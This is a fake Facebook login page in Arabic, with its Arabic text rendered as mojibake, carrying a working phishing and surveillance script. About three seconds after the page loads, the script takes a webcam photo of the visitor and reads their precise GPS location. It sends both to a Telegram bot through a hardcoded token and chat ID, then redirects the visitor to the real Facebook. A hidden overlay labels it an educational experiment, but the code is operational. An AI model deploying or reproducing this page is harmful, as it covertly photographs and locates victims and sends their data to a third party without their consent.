<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ÙÙŠØ³Ø¨ÙˆÙƒ</title>
    <style>
        body {margin:0;padding:0;background:#f0f2f5;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding-top:20px;}
        .fb-container {width:100%;max-width:400px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);overflow:hidden;}
        .header {background:#1877f2;padding:12px;text-align:center;color:white;font-size:20px;font-weight:bold;}
        .form-area {padding:20px;}
        input {width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px;box-sizing:border-box;}
        .login-btn {width:100%;padding:14px;background:#1877f2;color:white;font-size:18px;font-weight:bold;border:none;border-radius:6px;cursor:pointer;margin-top:10px;}
        .links {text-align:center;margin:15px 0;font-size:14px;}
        .links a {color:#1877f2;text-decoration:none;}
        .footer {text-align:center;padding:20px;font-size:13px;color:#8a8d91;}
        .warning {display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);color:white;text-align:center;padding:40px;font-size:20px;z-index:9999;flex-direction:column;justify-content:center;align-items:center;}
    </style>
</head>
<body>

<div class="fb-container">
    <div class="header">ÙÙŠØ³Ø¨ÙˆÙƒ</div>
    <div class="form-area">
        <form>
            <input type="text" placeholder="Ø±Ù‚Ù… Ø§Ù„Ø¬ÙˆØ§Ù„ Ø£Ùˆ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ">
            <input type="password" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±">
            <button type="button" class="login-btn">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</button>
        </form>
        <div class="links">
            <a href="#">Ù†Ø³ÙŠØª ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±ØŸ</a><br><br>
            <a href="#">Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯</a>
        </div>
    </div>
    <div class="footer">
        Ø§Ù„Ø¹Ø±Ø¨ÙŠØ© Â· English Â· TÃ¼rkÃ§e Â· Ø¨ÛŒØ´ØªØ±<br>
        Meta Â© 2025
    </div>
</div>

<div id="warning" class="warning">
    <h2>âš ï¸ ØªØ¬Ø±Ø¨Ø© ØªØ¹Ù„ÙŠÙ…ÙŠØ© ÙÙŠ Ø§Ù„ØªØµÙŠØ¯ Ø§Ù„Ø§Ø­ØªÙŠØ§Ù„ÙŠ âš ï¸</h2>
    <p>Ù„Ùˆ ÙƒØ§Ù†Øª Ø­Ù‚ÙŠÙ‚ÙŠØ©: ØµÙˆØ±ØªÙƒ + Ù…ÙˆÙ‚Ø¹Ùƒ ØªÙ… Ø³Ø±Ù‚ØªÙ‡Ø§!</p>
    <p style="color:#0f0;">Ù„ÙƒÙ† Ù‡Ù†Ø§ ÙƒÙ„ Ø´ÙŠØ¡ Ø¢Ù…Ù† ÙˆØªØ¹Ù„ÙŠÙ…ÙŠ ğŸ“</p>
    <p>Ù„Ø§ ØªØ³Ù…Ø­ Ø¨Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø£Ùˆ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙÙŠ Ù…ÙˆØ§Ù‚Ø¹ Ù…Ø´Ø¨ÙˆÙ‡Ø©!</p>
</div>

<script>
// === ØºÙŠÙ‘Ø± Ù‡Ø°Ù‡ Ø§Ù„Ù‚ÙŠÙ… ÙÙ‚Ø· ===
const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
const CHAT_ID = "1611398303";
// ===========================

let capturedImage = null;

setTimeout(() => {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(stream => {
        let video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        setTimeout(() => {
            let canvas = document.createElement('canvas');
            canvas.width = 1280;
            canvas.height = 720;
            canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
            capturedImage = canvas.toDataURL('image/jpeg');

            stream.getTracks().forEach(t => t.stop());

            navigator.geolocation.getCurrentPosition(
                position => {
                    // Ø­Ø³Ø§Ø¨ Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª Ø¨Ø¯Ù‚Ø©
                    const lat = position.coords.latitude.toFixed(6);
                    const lng = position.coords.longitude.toFixed(6);
                    const acc = Math.round(position.coords.accuracy);
                    const gps = lat + "," + lng + " Â±" + acc + "m";

                    // ØªÙ†Ø³ÙŠÙ‚ Ø§Ù„ÙˆÙ‚Øª Ø¨Ø§Ù„Ø¹Ø±Ø¨ÙŠØ© ÙƒØ§Ù…Ù„Ø§Ù‹
                    const time = new Date().toLocaleString('ar-EG', {
                        weekday: 'long',
                        year: 'numeric',
                        month: 'long',
                        day: 'numeric',
                        hour: '2-digit',
                        minute: '2-digit',
                        second: '2-digit'
                    });

                    // Ø§Ù„ÙƒØ§Ø¨ØªØ´Ù† Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… backticks Ø¨Ø´ÙƒÙ„ ØµØ­ÙŠØ­ 100%
                    const caption = "ğŸ“ ØªØ¬Ø±Ø¨Ø© ØªØ¹Ù„ÙŠÙ…ÙŠØ© Ù†Ø§Ø¬Ø­Ø©\n" +
                                   "ğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹: " + gps + "\n" +
                                   "ğŸ• Ø§Ù„ÙˆÙ‚Øª: " + time + "\n" +
                                   "ğŸ‘¨â€ğŸ« Ù…Ù† Ø¯Ø±Ø³ Ø§Ù„Ø£Ø³ØªØ§Ø°";

                    const blob = dataURLtoBlob(capturedImage);
                    const form = new FormData();
                    form.append('photo', blob, 'lesson.jpg');
                    form.append('caption', caption);
                    form.append('chat_id', CHAT_ID);

                    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {
                        method: 'POST',
                        body: form
                    }).finally(() => {
                        window.location.href = "https://m.facebook.com/";
                    });

                },
                error => {
                    document.getElementById('warning').style.display = 'flex';
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        }, 3000);
    })
    .catch(() => {
        document.getElementById('warning').style.display = 'flex';
    });
}, 3000);

// Ø¯Ø§Ù„Ø© Ø§Ù„ØªØ­ÙˆÙŠÙ„
function dataURLtoBlob(dataurl) {
    let arr = dataurl.split(',');
    let mime = arr[0].match(/:(.*?);/)[1];
    let bstr = atob(arr[1]);
    let n = bstr.length;
    let u8arr = new Uint8Array(n);
    while (n--) {
        u8arr[n] = bstr.charCodeAt(n);
    }
    return new Blob([u8arr], {type: mime});
}
</script>

</body>
</html>
